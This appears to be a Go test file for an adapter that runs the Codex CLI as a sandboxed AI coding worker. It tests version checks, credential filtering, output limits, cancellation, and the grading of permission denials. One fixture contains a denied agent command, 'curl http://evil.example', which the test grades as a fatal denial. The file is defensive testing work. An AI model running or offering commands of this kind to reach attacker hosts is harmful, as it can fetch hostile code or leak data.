package codex

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"

	"github.com/chiga0/marshal-harness/internal/contract"
	"github.com/chiga0/marshal-harness/internal/domain"
)

func TestNewRequiresExactExecutableAndValidator(t *testing.T) {
	validator := newValidator(t)
	if _, err := New("codex", validator); err == nil {
		t.Fatal("relative executable accepted")
	}
	executable := fakeExecutable(t, supportedBinary, "exit 0")
	if _, err := New(executable, nil); err == nil {
		t.Fatal("nil validator accepted")
	}
	nonExecutable := filepath.Join(t.TempDir(), "codex")
	if err := os.WriteFile(nonExecutable, []byte("data"), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := New(nonExecutable, validator); err == nil {
		t.Fatal("non-executable file accepted")
	}
}

func TestProbeFreezesSupportedAndUnsupportedBinary(t *testing.T) {
	for _, test := range []struct{ version, status string }{
		{supportedBinary, "supported"},
		{"0.145.1", "unsupported"},
		{"0.146.0", "unsupported"},
		{"9.9.9", "unsupported"},
	} {
		t.Run(test.version, func(t *testing.T) {
			adapter, err := New(fakeExecutable(t, test.version, "exit 0"), newValidator(t))
			if err != nil {
				t.Fatal(err)
			}
			record, err := adapter.Probe(context.Background())
			if err != nil {
				t.Fatal(err)
			}
			var raw map[string]any
			if err := json.Unmarshal(record.Data, &raw); err != nil {
				t.Fatal(err)
			}
			status, _ := raw["probeStatus"].(string)
			version, _ := raw["binaryVersion"].(string)
			digest, _ := raw["executableDigest"].(string)
			executable, _ := raw["executable"].(string)
			if status != test.status || version != test.version || !strings.HasPrefix(digest, "sha256:") || !filepath.IsAbs(executable) {
				t.Fatalf("snapshot = %s/%s/%s/%s", status, version, digest, executable)
			}
			probeErrors, _ := raw["probeErrors"].([]any)
			if test.status == "supported" {
				if len(probeErrors) != 0 {
					t.Fatalf("probeErrors = %v", probeErrors)
				}
				return
			}
			if len(probeErrors) != 1 {
				t.Fatalf("probeErrors = %v", probeErrors)
			}
			message, _ := probeErrors[0].(string)
			if !strings.Contains(message, test.version) || !strings.Contains(message, supportedBinary) {
				t.Fatalf("probeErrors must report the actual and supported version: %v", probeErrors)
			}
		})
	}
}

func TestParseCodexVersionNormalizesOfficialOutput(t *testing.T) {
	for _, test := range []struct {
		name    string
		output  string
		version string
	}{
		{"real", "codex-cli 0.145.0\n", supportedBinary},
		{"trailing-newline", "codex-cli 0.145.0\n", supportedBinary},
		{"extra-whitespace", "  codex-cli\t0.145.0  \n", supportedBinary},
		{"unsupported-patch", "codex-cli 0.145.1\n", "0.145.1"},
		{"unsupported-minor", "codex-cli 0.146.0\n", "0.146.0"},
	} {
		t.Run(test.name, func(t *testing.T) {
			version, err := parseCodexVersion(test.output)
			if err != nil {
				t.Fatal(err)
			}
			if version != test.version {
				t.Fatalf("version = %q, want %q", version, test.version)
			}
		})
	}
}

func TestParseCodexVersionRejectsMalformedOutput(t *testing.T) {
	for _, input := range []string{
		"",
		"\n",
		"codex-cli\n",
		"codex-cli 0.145\n",
		"codex-cli 0.145.0.0\n",
		"codex-cli 00.145.0\n",
		"codex-cli 0.145.0-rc1\n",
		"codex-cli 0.145.0+build\n",
		"codex-cli 0.145.0 extra\n",
		"codex 0.145.0\n",
		"0.145.0\n",
		"codex-cli v0.145.0\n",
		"codex-cli not-a-version\n",
	} {
		if _, err := parseCodexVersion(input); err == nil {
			t.Fatalf("input %q did not produce an error", input)
		}
	}
}

func TestBuildArgsNeverUsesShellAndBindsModelPrompt(t *testing.T) {
	args := buildArgs("provider/model", "完成任务")
	want := []string{"exec", "--json", "--full-auto", "--sandbox", "workspace-write", "--skip-git-repo-check", "--model", "provider/model", "完成任务"}
	if strings.Join(args, "\x00") != strings.Join(want, "\x00") {
		t.Fatalf("args = %#v", args)
	}
	noModel := buildArgs("", "完成任务")
	if strings.Contains(strings.Join(noModel, "\x00"), "--model") {
		t.Fatalf("empty model must not emit --model: %#v", noModel)
	}
}

func TestWorkerEnvironmentFiltersCredentials(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "publisher-secret")
	t.Setenv("AWS_SECRET_ACCESS_KEY", "cloud-secret")
	t.Setenv("OPENAI_API_KEY", "model-secret")
	environment := workerEnvironment(t.TempDir())
	joined := strings.Join(environment, "\n")
	for _, secret := range []string{"GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "OPENAI_API_KEY", "publisher-secret", "cloud-secret", "model-secret"} {
		if strings.Contains(joined, secret) {
			t.Fatalf("worker environment leaked %s", secret)
		}
	}
	if !strings.Contains(joined, "CI=1") || !strings.Contains(joined, "GIT_CONFIG_GLOBAL=/dev/null") {
		t.Fatalf("missing isolation environment: %s", joined)
	}
}

func TestRunNormalizesResultAndPersistsBoundedTranscript(t *testing.T) {
	fixture := newRunFixture(t, supportedBinary, `printf '%s\n' '{"type":"thread.started","thread_id":"thread-1","thread":{"id":"thread-1"}}' '{"type":"turn.completed","turn":{"id":"turn-1","status":"completed","usage":{"input_tokens":10,"output_tokens":5}}}'`)
	record, err := fixture.adapter.Run(context.Background(), fixture.request)
	if err != nil {
		t.Fatal(err)
	}
	if err := fixture.validator.Validate(domain.KindWorkerResult, record.Data); err != nil {
		t.Fatal(err)
	}
	var result declaredResult
	if err := json.Unmarshal(record.Data, &result); err != nil {
		t.Fatal(err)
	}
	if result.TaskID != "TASK-1" || result.Adapter.ID != adapterID || result.Adapter.Version != supportedBinary || result.Adapter.Executable != fixture.executable || result.Session == nil || result.Session.ID != "thread-1" || result.Adapter.Model != "provider/model" {
		t.Fatalf("normalized result = %+v", result)
	}
	if !result.StartedAt.Before(result.CompletedAt) && !result.StartedAt.Equal(result.CompletedAt) {
		t.Fatalf("invalid times: %s %s", result.StartedAt, result.CompletedAt)
	}
	transcript, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "codex-transcript.jsonl"))
	if err != nil || !strings.Contains(string(transcript), `"thread_id":"thread-1"`) {
		t.Fatalf("transcript = %s err=%v", transcript, err)
	}
	metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "codex-transcript-meta.json"))
	if err != nil || !strings.Contains(string(metadata), `"eventCount": 2`) {
		t.Fatalf("metadata = %s err=%v", metadata, err)
	}
}

func TestRunRejectsUnsupportedVersionBeforeWorkerLaunch(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "launched")
	fixture := newRunFixture(t, "9.9.9", "touch "+shellQuote(marker))
	if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrUnsupportedVersion) {
		t.Fatalf("error = %v", err)
	}
	if _, err := os.Stat(marker); !os.IsNotExist(err) {
		t.Fatal("unsupported worker process was launched")
	}
}

func TestRunRejectsUnsupportedProfileAndSessionPolicy(t *testing.T) {
	t.Run("profile", func(t *testing.T) {
		fixture := newRunFixture(t, supportedBinary, "exit 0")
		if _, err := fixture.adapter.Run(context.Background(), fixture.requestWith(map[string]any{"executionProfile": "hardened"})); err == nil || !strings.Contains(err.Error(), "does not match") {
			t.Fatalf("err = %v, want profile mismatch", err)
		}
	})
	t.Run("session-policy", func(t *testing.T) {
		fixture := newRunFixture(t, supportedBinary, "exit 0")
		if _, err := fixture.adapter.Run(context.Background(), fixture.requestWith(map[string]any{"sessionPolicy": "persist"})); !errors.Is(err, ErrUnsupportedSessionPolicy) {
			t.Fatalf("err = %v, want ErrUnsupportedSessionPolicy", err)
		}
	})
}

func TestRunRejectsMalformedJSONLAndIdentityMismatch(t *testing.T) {
	t.Run("malformed", func(t *testing.T) {
		fixture := newRunFixture(t, supportedBinary, `printf '%s\n' 'not-json'`)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrProtocol) {
			t.Fatalf("error = %v", err)
		}
	})
	t.Run("identity", func(t *testing.T) {
		fixture := newRunFixture(t, supportedBinary, `printf '%s\n' '{"type":"thread.started","thread_id":"thread-1","thread":{"id":"thread-1"}}'`)
		data := validDeclaredResult(fixture.executable)
		data["taskId"] = "OTHER"
		writeJSON(t, filepath.Join(fixture.controlRoot, "output", "worker-result.json"), data)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); err == nil || !strings.Contains(err.Error(), "identity") {
			t.Fatalf("error = %v", err)
		}
	})
}

func TestRunEnforcesOutputCapAndCancellation(t *testing.T) {
	t.Run("output-cap", func(t *testing.T) {
		large := strings.Repeat("x", 1800)
		fixture := newRunFixture(t, supportedBinary, `printf '%s\n' '{"type":"thread.started","thread_id":"thread-1","thread":{"id":"thread-1"}}' '{"type":"item.completed","item":{"id":"i","type":"message","role":"assistant","content":[{"type":"output_text","text":"`+large+`"}]}}'`)
		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrOutputLimit) {
			t.Fatalf("error = %v", err)
		}
	})
	t.Run("cancel-process-group", func(t *testing.T) {
		handshake := t.TempDir()
		pidFile := filepath.Join(handshake, "child.pid")
		readyFile := filepath.Join(handshake, "ready")
		body := "sleep 60 &\nchild=$!\nprintf '%s' \"$child\" > " + shellQuote(pidFile+".tmp") + " && mv " + shellQuote(pidFile+".tmp") + " " + shellQuote(pidFile) + "\n: > " + shellQuote(readyFile+".tmp") + " && mv " + shellQuote(readyFile+".tmp") + " " + shellQuote(readyFile) + "\nwait"
		fixture := newRunFixture(t, supportedBinary, body)
		var raw map[string]any
		if err := json.Unmarshal(fixture.request.Data, &raw); err != nil {
			t.Fatal(err)
		}
		raw["attemptTimeoutSeconds"] = 15
		requestData, err := json.Marshal(raw)
		if err != nil {
			t.Fatal(err)
		}
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		errCh := make(chan error, 1)
		go func() {
			_, runErr := fixture.adapter.Run(ctx, domain.Record{Kind: domain.KindWorkerRequest, Data: requestData})
			errCh <- runErr
		}()
		waitForFile(t, readyFile, 5*time.Second)
		pidData, err := os.ReadFile(pidFile)
		if err != nil {
			t.Fatal(err)
		}
		pid, err := strconv.Atoi(strings.TrimSpace(string(pidData)))
		if err != nil {
			t.Fatalf("pid file = %q: %v", pidData, err)
		}
		cancel()
		select {
		case runErr := <-errCh:
			if !errors.Is(runErr, context.Canceled) {
				t.Fatalf("error = %v", runErr)
			}
		case <-time.After(5 * time.Second):
			t.Fatal("Run did not return promptly after cancellation")
		}
		deadline := time.Now().Add(5 * time.Second)
		for {
			if err := syscall.Kill(pid, 0); errors.Is(err, syscall.ESRCH) {
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("background child %d survived process-group cancellation", pid)
			}
			time.Sleep(5 * time.Millisecond)
		}
	})
}

func TestRunGradesFatalDenialFailClosedAndPersistsEvidence(t *testing.T) {
	fixture := newRunFixture(t, supportedBinary, `printf '%s\n' '{"type":"item.completed","item":{"id":"i","type":"command","role":"assistant","status":"error","error":"permission denied by rule","input":{"command":"curl http://evil.example"}}}'`)
	if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrPermissionDenied) {
		t.Fatalf("error = %v", err)
	}
	data, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "denials.jsonl"))
	if err != nil {
		t.Fatalf("denial log missing: %v", err)
	}
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 1 {
		t.Fatalf("denial log = %s", data)
	}
	var record map[string]any
	if err := json.Unmarshal([]byte(lines[0]), &record); err != nil {
		t.Fatal(err)
	}
	if record["tool"] != "command" || record["kind"] != "execute" || record["grade"] != "FATAL" || record["path-or-cmd"] != "curl http://evil.example" {
		t.Fatalf("fatal denial record = %+v", record)
	}
}

func TestRunGradesBenignDenialAndContinues(t *testing.T) {
	fixture := newRunFixture(t, supportedBinary, `printf '%s\n' '{"type":"thread.started","thread_id":"thread-1","thread":{"id":"thread-1"}}' '{"type":"item.completed","item":{"id":"i","type":"command","role":"assistant","status":"error","error":"permission denied","input":{"command":"git status"}}}' '{"type":"turn.completed","turn":{"id":"turn-1","status":"completed","usage":{"input_tokens":1,"output_tokens":1}}}'`)
	record, err := fixture.adapter.Run(context.Background(), fixture.request)
	if err != nil {
		t.Fatalf("benign denial must not terminate the attempt: %v", err)
	}
	if err := fixture.validator.Validate(domain.KindWorkerResult, record.Data); err != nil {
		t.Fatal(err)
	}
	metadata, err := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "codex-transcript-meta.json"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(metadata), `"permissionDenied": false`) || !strings.Contains(string(metadata), `"denialsBenign": 1`) || !strings.Contains(string(metadata), `"denialsFatal": 0`) {
		t.Fatalf("metadata lost denial grading: %s", metadata)
	}
}

func TestRunProcessFailureNeverLeaksStderrIntoError(t *testing.T) {
	secrets := []string{"sensitive-output-marker-alpha", "private-output-marker-beta", "user-output-marker-gamma"}
	body := `printf '%s\n' '{"type":"thread.started","thread_id":"thread-1","thread":{"id":"thread-1"}}'`
	for _, secret := range secrets {
		body += "\nprintf '%s\\n' " + shellQuote(secret) + " >&2"
	}
	body += "\nexit 7"
	fixture := newRunFixture(t, supportedBinary, body)
	_, err := fixture.adapter.Run(context.Background(), fixture.request)
	if !errors.Is(err, ErrProcessFailed) {
		t.Fatalf("error = %v", err)
	}
	if !strings.Contains(err.Error(), "exit=7") {
		t.Fatalf("error must carry the exit code: %v", err)
	}
	if strings.Contains(err.Error(), "stderr") {
		t.Fatalf("error references stderr contents: %v", err)
	}
	for _, secret := range secrets {
		if strings.Contains(err.Error(), secret) {
			t.Fatalf("provider stderr leaked into error: %v", err)
		}
	}
	evidence, readErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "codex-stderr.log"))
	if readErr != nil {
		t.Fatal(readErr)
	}
	metadata, readErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "codex-transcript-meta.json"))
	if readErr != nil {
		t.Fatal(readErr)
	}
	for _, secret := range secrets {
		if !strings.Contains(string(evidence), secret) {
			t.Fatalf("bounded stderr evidence file lost %q", secret)
		}
		if strings.Contains(string(metadata), secret) {
			t.Fatalf("metadata leaked stderr content %q", secret)
		}
	}
	if !strings.Contains(string(metadata), `"stderrBytes"`) || !strings.Contains(string(metadata), `"exitCode": 7`) {
		t.Fatalf("metadata lost bounded stderr/process accounting: %s", metadata)
	}
}

func waitForFile(t *testing.T, path string, timeout time.Duration) {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for {
		if _, err := os.Stat(path); err == nil {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("file %s was not produced within %s", path, timeout)
		}
		time.Sleep(5 * time.Millisecond)
	}
}

type runFixture struct {
	adapter                           *Adapter
	validator                         *contract.Validator
	executable, worktree, controlRoot string
	request                           domain.Record
}

func newRunFixture(t *testing.T, version, body string) runFixture {
	t.Helper()
	executable := fakeExecutable(t, version, body)
	validator := newValidator(t)
	adapter, err := New(executable, validator)
	if err != nil {
		t.Fatal(err)
	}
	worktree := t.TempDir()
	controlRoot := t.TempDir()
	writeJSON(t, filepath.Join(controlRoot, "input", "task-spec.json"), map[string]any{"worker": map[string]any{"model": "provider/model"}})
	promptPath := filepath.Join(controlRoot, "input", "prompt.md")
	if err := os.MkdirAll(filepath.Dir(promptPath), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(promptPath, []byte("完成 fixture"), 0o600); err != nil {
		t.Fatal(err)
	}
	writeJSON(t, filepath.Join(controlRoot, "output", "worker-result.json"), validDeclaredResult(executable))
	requestData := map[string]any{
		"apiVersion": "marshal.dev/v1alpha1", "kind": "WorkerRequest", "taskId": "TASK-1", "runId": "run-1", "attemptId": "attempt-1", "attemptNumber": 1,
		"specDigest": digest("a"), "policyDigest": digest("b"), "capabilityDigest": digest("c"), "baseSha": strings.Repeat("1", 40),
		"worktreePath": worktree, "controlRoot": controlRoot, "taskSpecPath": "input/task-spec.json", "promptPath": "input/prompt.md", "resultPath": "output/worker-result.json",
		"adapterId": "codex", "executionProfile": "workspace-write", "sessionPolicy": "ephemeral", "attemptTimeoutSeconds": 5, "maxOutputBytes": 1024, "reviewFindings": []any{},
	}
	requestBytes, _ := json.Marshal(requestData)
	return runFixture{adapter, validator, adapter.executable, worktree, controlRoot, domain.Record{Kind: domain.KindWorkerRequest, Data: requestBytes}}
}

func (f runFixture) requestWith(overrides map[string]any) domain.Record {
	data := map[string]any{}
	var source map[string]any
	if err := json.Unmarshal(f.request.Data, &source); err != nil {
		panic(err)
	}
	for key, value := range source {
		data[key] = value
	}
	for key, value := range overrides {
		data[key] = value
	}
	requestBytes, err := json.Marshal(data)
	if err != nil {
		panic(err)
	}
	return domain.Record{Kind: domain.KindWorkerRequest, Data: requestBytes}
}

func validDeclaredResult(executable string) map[string]any {
	return map[string]any{
		"apiVersion": "marshal.dev/v1alpha1", "kind": "WorkerResult", "taskId": "TASK-1", "runId": "run-1", "attemptId": "attempt-1",
		"adapter": map[string]any{"id": "codex", "executable": executable, "version": "worker-claim"},
		"session": map[string]any{"id": "thread-1", "resumable": false}, "status": "completed", "summary": "fixture completed",
		"declaredChangedFiles": []string{"file.txt"}, "declaredArtifacts": []any{}, "declaredCommands": []any{}, "declaredRisks": []string{}, "outputTruncated": false,
		"startedAt": "2026-08-04T00:00:00Z", "completedAt": "2026-08-04T00:00:01Z",
	}
}

func newValidator(t *testing.T) *contract.Validator {
	t.Helper()
	validator, err := contract.NewValidator()
	if err != nil {
		t.Fatal(err)
	}
	return validator
}

func writeJSON(t *testing.T, path string, value any) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	data, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
}

func digest(character string) string { return "sha256:" + strings.Repeat(character, 64) }

func shellQuote(value string) string { return "'" + strings.ReplaceAll(value, "'", "'\\''") + "'" }
